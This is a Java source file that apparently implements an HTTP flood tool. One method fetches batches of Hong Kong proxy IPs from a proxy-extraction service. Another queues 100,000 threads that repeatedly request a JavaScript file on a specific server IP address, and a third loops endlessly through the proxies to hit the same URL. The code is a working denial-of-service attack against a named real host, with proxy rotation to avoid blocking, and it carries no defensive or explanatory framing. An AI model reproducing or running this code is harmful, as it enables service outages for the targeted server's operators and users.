package com.gf.ip;

import com.alibaba.fastjson.JSONObject;
import com.gf.thread.SendThread;
import com.gf.util.RestTemplate;

import java.util.List;

public class IpUtil {
    private static  final  String RUL="http://tiqu.linksocket.com:81/abroad?num=500&type=2&lb=1&sb=0&flow=1&regions=hk&port=1&n=0";

    public static List<IpData> getIp()throws Exception{
        String resultString=RestTemplate.sendGet(RUL);
        IpResult result= JSONObject.parseObject(resultString,IpResult.class);
        if (result==null)
            return null;
        return result.getData();
    }
    public static void main(String[]  df)throws Exception{
        String url="http://103.107.189.90:9191/js/jquery.js";
        int i=0;
        while (i<100000){
            SendThread thread=new SendThread(url);
            SendThread.THREAD_POOL.execute(thread);
            i++;
        }

    }

    public static void main1()throws Exception{
        String url="http://103.107.189.90:9191/js/jquery.js";
        List<IpData> ips=getIp();
        /*String html2=RestTemplate.sendGetProxy(url,ips.get(0).getIp(),ips.get(0).getPort());
        System.out.println("这是长度："+html2.length());*/
        if (ips==null)
            return;
        int i=0;
        while (true){
            if (i>=ips.size()&&i<10000){
                ips.addAll(getIp());
            }else if (i>=10000){
                i=0;
            }
            IpData ipData=ips.get(i);
            String html=RestTemplate.sendGetProxy(url,ipData.getIp(),ipData.getPort());
            i++;
        }

    }
}
